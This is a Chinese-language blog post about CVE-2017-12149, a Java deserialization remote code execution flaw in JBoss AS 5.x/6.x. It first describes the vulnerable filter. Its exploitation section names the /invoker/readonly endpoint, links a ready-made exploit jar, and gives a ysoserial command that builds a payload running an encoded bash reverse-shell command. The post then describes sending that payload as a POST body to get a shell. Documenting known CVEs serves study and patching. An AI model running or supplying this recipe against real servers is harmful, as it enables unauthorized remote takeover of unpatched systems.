---
layout: post
title:  "CVE-2017-12149 JBoss java deserialization vulnerability"
date:   2019-01-12 20:15:33 +0700
categories: [Web安全]
---

## 0x00 **漏洞概要**

| **漏洞名称**                   | JBOSSAS5.x/6.x反序列化命令执行漏洞 |
| ------------------------------ | ---------------------------------- |
| **威胁类型**                   | 远程命令执行                       |
| **威胁等级**                   | 高                                 |
| **漏洞ID**                     | CVE-2017-12149                     |
| **受影响系统及应用版本**       | Jboss AS 5.xJbossAS 6.x            |
| **不受影响影响系统及应用版本** |                                    |

## 0x01 漏洞描述

该漏洞为 Java反序列化错误类型，存在于 Jboss 的 HttpInvoker 组件中的 ReadOnlyAccessFilter 过滤器中。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，从而导致了漏洞。

## 0x01 漏洞分析

![Snipaste_2019_01_12_15_17]({{site.url}}/images/Snipaste_2019_01_12_15_17.png)

上面是`doFilter`函数过滤器，由于其没有对HTTP POST的数据进行有效的检验，所以导致该漏洞

## 0x02 漏洞利用

![Snipaste_2019-01-12_15-39-48]({{site.url}}/images/Snipaste_2019-01-12_15-39-48.png)

访问` /invoker/readonly `请求中，服务器将用户提交的POST内容进行了Java反序列化

![Snipaste_2019-01-12_15-42-22]({{site.url}}/images/Snipaste_2019-01-12_15-42-22.png)

一般存在这个就存在漏洞了。

**使用工具：**

![Snipaste_2019-01-12_16-02-04]({{site.url}}/images/Snipaste_2019-01-12_16-02-04.png)

工具地址：https://github.com/threeworld/java-deserialization-exploits/blob/master/JBoss/jboss%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96_CVE-2017-12149.jar

**使用ysoserial来复现生成序列化数据**

**生成二进制文件：**

```
java -jar ysoserial.jar CommonsCollections5 "bash -c {echo,xxxxx:xxx}|{base64,-d}|{bash,-i}" > poc.ser
```

**发送POC**

生成好的POC即为poc.ser，将这个文件作为POST Body发送至/invoker/readonly即可：

[![img](https://github.com/vulhub/vulhub/raw/master/jboss/CVE-2017-12149/img/3.png)](https://github.com/vulhub/vulhub/blob/master/jboss/CVE-2017-12149/img/3.png)

成功反弹shell：

[![img](https://github.com/vulhub/vulhub/raw/master/jboss/CVE-2017-12149/img/4.png)](https://github.com/vulhub/vulhub/blob/master/jboss/CVE-2017-12149/img/4.png)